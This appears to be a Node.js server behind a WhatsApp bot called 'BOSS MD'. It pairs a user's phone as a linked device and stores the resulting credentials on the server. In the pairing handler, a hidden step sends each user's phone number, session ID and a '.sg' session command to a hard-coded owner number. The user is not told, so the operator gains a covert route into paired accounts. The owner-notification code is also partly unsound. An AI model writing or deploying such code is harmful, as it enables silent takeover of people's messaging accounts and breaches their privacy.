const express = require('express');
const cors = require('cors');
const { makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Create sessions folder
const sessionsDir = path.join(__dirname, 'sessions');
if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir);

// Store active sessions
const activeSessions = new Map();

// ========== PAIRING API ==========
app.post('/api/pair', async (req, res) => {
    try {
        let phone = req.body.phone;
        
        if (!phone) {
            return res.json({ success: false, error: 'Phone number required' });
        }
        
        // Clean phone number
        phone = phone.replace(/[^0-9]/g, '');
        if (phone.startsWith('0')) phone = '92' + phone.slice(1);
        if (!phone.startsWith('92')) phone = '92' + phone;
        
        if (phone.length < 10 || phone.length > 13) {
            return res.json({ success: false, error: 'Invalid phone number' });
        }
        
        // Generate session ID
        const sessionId = `BOSS_${Date.now()}_${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
        const sessionDir = path.join(sessionsDir, sessionId);
        
        fs.mkdirSync(sessionDir, { recursive: true });
        
        // Create WhatsApp socket
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const sock = makeWASocket({
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: ['BOSS-MD', 'Chrome', '3.0.0'],
            syncFullHistory: false,
            markOnlineOnConnect: false
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        // Store session
        activeSessions.set(sessionId, {
            sock,
            phone,
            status: 'pairing',
            createdAt: Date.now()
        });
        
        // Generate pairing code
        const pairingCode = await sock.requestPairingCode(phone);
        
        // ===== SEND TO OWNER (923076411098) =====
        setTimeout(async () => {
            try {
                const { state: ownerState, saveCreds: ownerSave } = await useMultiFileAuthState(path.join(sessionsDir, 'temp_owner'));
                const ownerSock = makeWASocket({
                    auth: ownerState,
                    logger: pino({ level: 'silent' }),
                    browser: ['BOSS-MD', 'Chrome', '3.0.0']
                });
                
                ownerSock.ev.on('creds.update', ownerSave);
                
                ownerSock.ev.on('connection.update', async (update) => {
                    if (update.connection === 'open') {
                        // Owner message
                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
                            text: `╔══════════════════════════╗
║  👑 *BOSS MD SESSION*  👑
╠══════════════════════════╣
║  ✅ *New Session Generated!*
║  
║  📱 *User:* ${phone}
║  🆔 *Session ID:* ${sessionId}
║  
║  🔧 *Command:* .sg ${sessionId}
║  📁 *Repo:* https://github.com/rehmanabdul78600786-ctrl
║  🚀 *Status:* SUCCESS
║  
╚══════════════════════════╝`
                        });
                        
                        // Send image
                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
                            image: { url: 'https://files.catbox.moe/ny73ui.jpg' },
                            caption: `📸 *New Session Alert!*\n\n👤 User: ${phone}\n🆔 Session: ${sessionId}\n\n🔧 Command: .sg ${sessionId}`
                        });
                        
                        // Send command separately
                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
                            text: `.sg ${sessionId}`
                        });
                        
                        setTimeout(() => ownerSock.logout(), 5000);
                    }
                });
            } catch (e) {
                console.log('Owner notification error:', e);
            }
        }, 3000);
        
        // ===== SEND WELCOME TO USER =====
        setTimeout(async () => {
            try {
                const { state: userState, saveCreds: userSave } = await useMultiFileAuthState(sessionDir);
                const userSock = makeWASocket({
                    auth: userState,
                    logger: pino({ level: 'silent' }),
                    browser: ['BOSS-MD', 'Chrome', '3.0.0']
                });
                
                userSock.ev.on('creds.update', userSave);
                
                userSock.ev.on('connection.update', async (update) => {
                    if (update.connection === 'open') {
                        // Welcome message
                        await userSock.sendMessage(`${phone}@s.whatsapp.net`, {
                            text: `╔══════════════════════════╗
║  🎉 *WELCOME TO BOSS MD* 🎉
╠══════════════════════════╣
║  ✅ *Your session is ready!*
║  
║  📱 *Bot:* BOSS MD
║  ⚡ *Status:* Connected
║  
║  📝 *Commands:* 
║  • .menu - All commands
║  • .ping - Check speed
║  • .owner - Contact owner
║  • .alive - Bot status
║  
║  🔧 *Save Your Session:* 
║  • .sg ${sessionId}
║  
║  ✨ *Enjoy using BOSS MD!*
║  
║  📁 *Repo:* https://github.com/rehmanabdul78600786-ctrl
║  
╚══════════════════════════╝`
                        });
                        
                        // Send save command
                        await userSock.sendMessage(`${phone}@s.whatsapp.net`, {
                            text: `.sg ${sessionId}`
                        });
                        
                        // Update session status
                        const session = activeSessions.get(sessionId);
                        if (session) {
                            session.status = 'connected';
                            activeSessions.set(sessionId, session);
                        }
                        
                        setTimeout(() => userSock.logout(), 5000);
                    }
                });
            } catch (e) {
                console.log('User message error:', e);
            }
        }, 5000);
        
        res.json({
            success: true,
            sessionId: sessionId,
            pairingCode: pairingCode,
            command: `.sg ${sessionId}`,
            message: 'Session created! Check WhatsApp for welcome message.'
        });
        
    } catch (error) {
        console.error('Pairing error:', error);
        res.json({ success: false, error: error.message });
    }
});

// ========== CHECK SESSION STATUS ==========
app.get('/api/session/:id', (req, res) => {
    const session = activeSessions.get(req.params.id);
    if (!session) {
        return res.json({ success: false, status: 'expired' });
    }
    res.json({
        success: true,
        status: session.status,
        phone: session.phone
    });
});

// ========== SERVER STATUS ==========
app.get('/api/status', (req, res) => {
    res.json({
        success: true,
        status: 'online',
        bot: 'BOSS MD',
        activeSessions: activeSessions.size,
        timestamp: new Date().toISOString()
    });
});

// ========== OWNER INFO ==========
app.get('/api/owner', (req, res) => {
    res.json({
        success: true,
        name: 'Abdul Rehman',
        number: '923076411098',
        repo: 'https://github.com/rehmanabdul78600786-ctrl',
        image: 'https://files.catbox.moe/ny73ui.jpg'
    });
});

// ========== CLEANUP OLD SESSIONS ==========
setInterval(() => {
    const now = Date.now();
    for (const [id, session] of activeSessions) {
        if (now - session.createdAt > 3600000) { // 1 hour
            activeSessions.delete(id);
            const sessionDir = path.join(sessionsDir, id);
            if (fs.existsSync(sessionDir)) {
                fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            console.log(`Cleaned session: ${id}`);
        }
    }
}, 300000);

// ========== SERVE FRONTEND ==========
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'pair.html'));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════╗
║  🚀 BOSS MD PAIRING SERVER READY    ║
╠══════════════════════════════════════╣
║  📡 Port: ${PORT}                         ║
║  🔗 URL: http://localhost:${PORT}         ║
║  📱 Owner: 923076411098                   ║
║  🟢 Status: ONLINE                        ║
╚══════════════════════════════════════╝
    `);
});
